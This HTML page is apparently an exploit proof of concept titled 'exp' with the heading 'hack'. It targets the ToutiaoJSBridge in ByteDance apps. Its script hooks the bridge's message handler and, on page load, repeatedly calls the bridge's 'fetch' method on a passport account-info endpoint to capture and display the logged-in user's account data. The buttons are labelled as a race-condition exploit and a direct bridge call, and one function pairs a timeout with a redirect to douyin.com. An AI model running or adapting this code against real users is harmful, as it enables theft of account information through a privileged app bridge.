<html>

<head>
  <meta charset="UTF-8" />
  <title>exp</title>
  <script type="text/javascript">


    window.ToutiaoJSBridge._handleMessageFromToutiao = function (f) {
      var re = JSON.stringify(f);
      if (!re.includes("Permission") && !re.includes("H5_visibilityChange")) {
        alert(re);
        console.log('proyx1122:' + JSON.stringify(f));
      } else {
        //alert(JSON.stringify(f));
        console.log('proyx:' + JSON.stringify(f));
      }

    }

    function f4() {
      for (var i = 0; i < 5; i++) {
        func1();
      }
    }

    function attack1() {
      setTimeout(func1, 15);
      location.href = ("https://www.douyin.com/");
    }

    function func1() {
      window.ToutiaoJSBridge.invokeMethod(
        JSON.stringify(
          {
            __callback_id: "test",
            func: "fetch",
            params: {
              url: "https://is.snssdk.com/passport/account/info/v2/",
              method: "GET"
            },
            namespace: "",
            JSSDK: "1.2.1",
            __msg_type: "call"
          }
        )
      );
    }

    f4();
  </script>
</head>

<body>
  <h1>hack</h1>
  <button style="width:200px;height:200px;" onclick="f4()">exp-条件竞争</button><br />
  <button style="width:200px;height:200px;" onclick="func1()">exp2-直接调用jsb</button><br />
  <button style="width:200px;height:200px;" onclick="location.href=location.href+'?'">F5</button>

</body>

</html>
